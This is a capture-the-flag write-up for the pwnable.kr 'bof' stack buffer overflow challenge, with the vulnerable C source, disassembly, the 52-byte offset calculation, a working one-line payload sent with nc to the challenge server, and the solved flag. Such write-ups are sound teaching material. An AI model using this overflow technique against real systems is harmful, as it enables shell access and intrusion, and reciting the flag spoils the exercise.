# Writeup: bof (pwnable.kr)

## Challenge Info
- **Target:** `bof`
- **Vulnerability:** Stack-based Buffer Overflow
- **Source Snippet:**
  ```c
  void func(int key){
      char overflowme[32];
      gets(overflowme); // Vulnerable
      if(key == 0xcafebabe){
		   setregid(getegid(), getegid());
          system("/bin/sh");
      }
  }
  ```

## Analysis
The challenge binary uses the vulnerable `gets()` function to read input into a 32-byte buffer (`overflowme`). Since `gets()` does not perform bounds checking, we can overflow this buffer to reach and overwrite the `key` parameter stored further down the stack.

<img width="400" height="400" alt="My poor drawing of a stack" src="https://github.com/user-attachments/assets/e58cef2e-2bdf-4df9-bdf8-39749610cdb9" />
<br/>
(my poor drawing of a stack)

### Disassembly (IDA)
In `func`, we identify the stack offsets for the buffer and the argument:
- **Buffer (`overflowme`)**: Loaded into `eax` via `lea eax, [ebp-2c]`.
- **Key**: Compared at `ebp+8h`.

```asm
.text:00001230    lea     eax, [ebp-2Ch]  ; buffer loaded from ebp-2c
.text:00001233    push    eax
.text:00001234    call    _gets
...
.text:0000123C    cmp     [ebp+8h], 0CAFEBABEh ; arg_0 is at ebp+8h
```

### Exploitation
The distance from the start of the buffer to the `key` argument is:
`0x08 - (-0x2C) = 0x34 = 52 bytes`

Therefore, we need 52 bytes of padding (32 bytes taken by the buffer, 20 bytes from the compiler padding) followed by the target value `0xcafebabe`.

The binary has a stack canary, but since we are overwriting an argument located above the return address and the canary we don't trigger it.

After getting root access, we just run `cat flag` to succesfuly get the flag.

### Payload
Python to generate the payload. little-endian, `0xcafebabe` becomes `\xbe\xba\xfe\xca`.

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*52 + b'\xbe\xba\xfe\xca')"; cat) | nc pwnable.kr 9000
```

## Flag
`Daddy_I_just_pwned_a_buff3r!`
